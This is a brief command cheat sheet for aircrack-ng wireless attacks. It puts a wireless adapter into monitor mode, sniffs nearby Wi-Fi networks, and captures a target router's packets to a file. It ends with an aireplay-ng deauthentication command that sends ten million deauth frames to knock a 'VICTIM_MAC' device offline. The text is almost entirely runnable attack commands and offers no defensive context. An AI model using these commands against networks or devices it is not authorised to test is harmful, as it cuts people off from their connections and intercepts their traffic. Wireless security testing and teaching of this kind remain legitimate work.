#Change Wireless Adapter Mode
iwconfig //Inorder to check the current mode
ifconfig wlan0 down
airmon-ng check kill //For safety purpose to kill the processes
iwconfig wlan0 mode monitor
ifconfig wlan0 up

#Search the Network for different WIFI signals by Sniffing all the Packets
{airodump-ng wlan0 //for 2.4 GHz signals
airodump-ng --band a wlan0 //for 5 GHz signals
airodump-ng --band abg wlan0 //for all ranges}


#Targer Router for Sniffing
airodump-ng --bssid MAC_ADDRESS_OF_ROUTER --channel ROUTER_CHANNEL --write ANY_FILE_NAME wlan0
//After Sniffing open the FILE in wireshark for viewing the Packets

#Deauthenticate the Specific System/ Disconnect it from the internet
aireplay-ng --deauth 10000000 -a ROUTER_MAC -c VICTIM_MAC wlan0
